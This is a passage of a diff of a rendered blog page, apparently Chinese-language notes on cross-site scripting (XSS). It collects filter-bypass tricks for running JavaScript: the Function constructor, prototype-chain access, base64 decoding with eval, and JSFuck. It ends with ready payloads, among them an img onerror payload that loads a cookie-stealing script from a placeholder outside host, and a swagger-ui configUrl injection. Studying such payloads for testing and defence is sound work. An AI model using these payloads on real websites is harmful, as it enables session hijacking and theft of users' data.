class="string">&quot;alert(1)&quot;</span>,<span class="number">999</span>)</span><br><span class="line"><span class="number">4.</span> 匿名函数          (<span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;)<span class="string">``</span>	</span><br><span class="line">							(<span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;)()</span><br><span class="line"><span class="number">5.</span> 署名函数          <span class="title class_">Function</span>(<span class="string">&quot;alert(1)&quot;</span>)<span class="string">``</span>	</span><br><span class="line">							<span class="title class_">Function</span>(<span class="string">&quot;alert(1)&quot;</span>)()</span><br><span class="line"><span class="number">6.</span> 原型链              <span class="string">&quot;&quot;</span>.<span class="property">at</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;alert(1)&quot;</span></span>)(<span class="params"></span>)	</span><br><span class="line">							<span class="string">&quot;&quot;</span>[<span class="string">&#x27;at&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&quot;alert(1)&quot;</span>)()  <span class="comment">//可以换种方式访问对象，全部转化为字符串</span></span><br><span class="line"><span class="number">7.</span> <span class="title class_">Symbol</span>.<span class="property">hasInstanceof</span></span><br></pre></td></tr></table></figure>
+<h3 id="6-base-64-guo-lu-guan-jian-zi" id="6-base64过滤关键字">6. base64过滤关键字</h3>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">btoa</span>(<span class="string">&#x27;alert(1)&#x27;</span>)   <span class="comment">//编码</span></span><br><span class="line"><span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>)   <span class="comment">//解码</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>))</span><br></pre></td></tr></table></figure>
 <p><em><strong>同样，也可以换成ascii和JS8编码绕过</strong></em></p>
-<h3 id="7-弱类型"><a href="#7-弱类型" class="headerlink" title="7. 弱类型"></a>7. 弱类型</h3><p>js是弱类型语言，会进行类型转换，所以就延伸了下面这一种绕过方式</p>
+<h3 id="7-ruo-lei-xing" id="7-弱类型">7. 弱类型</h3>
+<p>js是弱类型语言，会进行类型转换，所以就延伸了下面这一种绕过方式</p>
 <p>JSFUCK</p>
-<p><a target="_blank" rel="noopener" href="https://jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a></p>
-<h2 id="3-特殊情况"><a href="#3-特殊情况" class="headerlink" title="3. 特殊情况"></a>3. 特殊情况</h2><ul>
-<li><p>闭合引号后，等号被删除，即不允许使用属性</p>
-<ul>
-<li>闭合标签</li>
+<p>[JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+](<a target="_blank" rel="noopener" href="https://jsfuck.com/">https://jsfuck.com/</a>)</p>
+<h2 id="3-te-shu-qing-kuang" id="3-特殊情况">3. 特殊情况</h2>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>闭合引号后，等号被删除，即不允许使用属性</p>
+<ul class="lvl-2">
+<li class="lvl-4">闭合标签</li>
 </ul>
 </li>
-<li><p>双引号被转义</p>
-<ul>
-<li><p><code>&lt;input xxx value=&quot;\\\&quot; onload=xxx \&quot;&quot;&gt;</code></p>
-<p>结果&lt;input xxx value&#x3D;”\&quot; onload&#x3D;xxx &quot;“&gt;</p>
+<li class="lvl-2">
+<p>双引号被转义</p>
+<ul class="lvl-2">
+<li class="lvl-4">
+<p><code>&lt;input xxx value=&quot;\\\&quot; onload=xxx \&quot;&quot;&gt;</code></p>
+<p>结果&lt;input xxx value=“\&quot; onload=xxx &quot;”&gt;</p>
 </li>
 </ul>
 </li>
 </ul>
-<h2 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS payload"></a>XSS payload</h2><ul>
-<li><p>xss-img-cookie:</p>
+<h2 id="xss-payload" id="XSS-payload">XSS payload</h2>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>xss-img-cookie:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;s==document.createElement(`script`);s.src=`https://xxx/cookie.js`;document.body.appendChild(s)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>swagger-ui xss</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json</span><br></pre></td></tr></table></figure></li>
+<li class="lvl-2">
+<p>swagger-ui xss</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 
     </div>
@@ -445,13 +473,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">18k</span>
+    <span title="站点总字数">20k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">32 分钟</span>
+    <span title="站点阅读时长">37 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
